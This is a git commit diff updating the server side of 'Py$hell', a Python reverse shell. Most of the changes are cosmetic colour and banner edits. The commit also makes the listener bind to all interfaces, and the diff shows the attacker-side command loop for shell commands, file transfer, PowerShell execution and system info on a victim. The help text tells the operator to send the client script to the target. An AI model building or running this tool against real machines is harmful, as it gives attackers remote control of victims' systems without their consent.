ccc0f31ebc3b30b4d56d495013fb6b8b05671b0b
Kremer5 <119752881+Kremer5@users.noreply.github.com>
2022-12-24 02:58:05 +0200

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,22 +1,12 @@
 # Reverse Shell Written in python #
-
 import platform
 import socket
 import subprocess
 import os
 import pyfiglet
-from colorama import Fore, Style
 
-Light_Red = Fore.LIGHTRED_EX
-Cyan = Fore.CYAN
-Magenta = Fore.MAGENTA
-Red = Fore.RED
-Green = Fore.GREEN
-Blue = Fore.BLUE
-Reset = Fore.RESET
-print(f"{Blue}{pyfiglet.figlet_format('Py$hell')}{Reset}")
 s = socket.socket()
-IP = "127.0.0.1"
+IP = "0.0.0.0"
 PORT = 4444
 BUF_SIZE = 2048
 FORMAT = 'utf-8'
@@ -25,19 +15,25 @@ OS = platform.platform()
 
 def main():
     global conn, addr
+    colors()
+    print(f"""{Blue}
+    ╔═╗┬ ┬┌┼┐┬ ┬┌─┐┬  ┬  
+    ╠═╝└┬┘└┼┐├─┤├┤ │  │  
+    ╩   ┴ └┼┘┴ ┴└─┘┴─┘┴─┘                         
+{Normal}""")
     while True:
         try:
             s.bind((IP, PORT))
             break
         except ConnectionRefusedError:
-            print(f"{Red}connections refused{Reset}")
+            print(f"{Red}Connections Refused{Normal}")
             s.close()
             continue
-    print(f"{Magenta}[+] Listening For Connection...{Reset}")
+    print(f"{Light_Purple}[+] Listening For Connection...{Normal}")
     s.listen(5)
     conn, addr = s.accept()
-    print(f"{Green}[+] Connection Has Been Established {Reset}")
-    print(f"{Cyan}[+] Server Started{Reset}" + "\n" + " | " "IP " + addr[0] + " | Port "
+    print(f"{Green}[+] Connection Has Been Established {Normal}")
+    print(f"{Cyan}[+] Server Started{Normal}" + "\n" + " | " "IP " + addr[0] + " | Port "
           + str(addr[1]) + " | ")
     answer = reverse_shell(conn)
     if answer == "exit":
@@ -50,7 +46,7 @@ def main():
                 conn.send(user_input.encode('utf-8'))
                 output = conn.recv(BUF_SIZE).decode(FORMAT)
             except ValueError as e:
-                print(f"{Red}[!] The Problem Is: {e} {Reset}")
+                print(f"{Red}[!] The Problem Is: {Light_Red}{e} {Normal}")
                 continue
             if user_input == 1:
                 if output == 1:
@@ -61,6 +57,23 @@ def main():
                 continue
             else:
                 return 0
+
+
+def colors():
+    global Yellow, Red, Normal, Green, Gray, Blue, Purple, Cyan, Light_Red, Light_Green, Light_Purple, Light_Blue
+    Yellow = "\033[1;33;40m"
+    Red = "\033[1;40m"
+    Light_Red = '\033[2;31m'
+    Normal = "\033[0;0m"
+    Green = "\033[1;32m"
+    Light_Green = "\033[2;32;40m"
+    Gray = "\033[1;30;40m"
+    Blue = "\033[1;34m"
+    Light_Blue = "\033[2;34;40m"
+    Cyan = '\033[1;36m'
+    Purple = '\033[0;35;40m'
+    Light_Purple = '\033[2;35m'
+    Light_Green = "\033[2;32;40m"
 
 
 def reverse_shell(conn):
@@ -75,7 +88,7 @@ def reverse_shell(conn):
             if "exit" == command.lower():
                 conn.send('exit'.encode(FORMAT))
                 s.close()
-                print("\t[!][!][!]  ! EXITING !  [!][!][!]\n")
+                print(f"{Red}\t[!][!][!]  ! EXITING !  [!][!][!]\n{Normal}")
                 return "exit"
             elif "cd" in command.lower():
                 stdout = conn.recv(BUF_SIZE).decode(FORMAT)
@@ -97,7 +110,7 @@ def reverse_shell(conn):
                         file_to_write.write(bytes(data))
                     file_to_write.close()
             elif "help1" in command.lower():
-                help1()
+                help()
                 continue
             elif "ps" in command.lower():
                 stdout = conn.recv(BUF_SIZE).decode(FORMAT)
@@ -108,20 +121,20 @@ def reverse_shell(conn):
                 print(str(stdout))
                 continue
         except Exception as e:
-            print(f"{Red}[!] Wrong Options, Error: {e} {Reset}")
+            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {e} {Normal}")
             continue
         except BrokenPipeError as d:
-            print(f"{Red}[!] Wrong Options, Error: {d} {Reset}")
+            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {d} {Normal}")
             continue
         except KeyboardInterrupt as i:
-            print(f"{Red}[!] Wrong Options, Error: {i} {Reset}")
+            print(f"{Red}[!] Wrong Options, {Light_Red}Error: {i} {Normal}")
             s.close()
             exit()
         s.close()
 
 
 def help1():
-    print("""HELP ME PLEASE:
+    print(f"""{Light_Blue}HELP ME PLEASE:
 \tThis is Py$hell, a python based reverse shell.
 \tYou need to send to the target the client side of the script.
 \tIt will be in the directory by the name reverse-shell_client.py .
@@ -143,7 +156,7 @@ def help1():
 \t\tifconfig : For showing interfaces and IP's 
 \t\tpowershell <powershell command> : For running a powershell command (only for windows)
 \t\tsysinfo : Show the system information\n
-    """)
+    {Normal}""")
 
 
 if __name__ == '__main__':
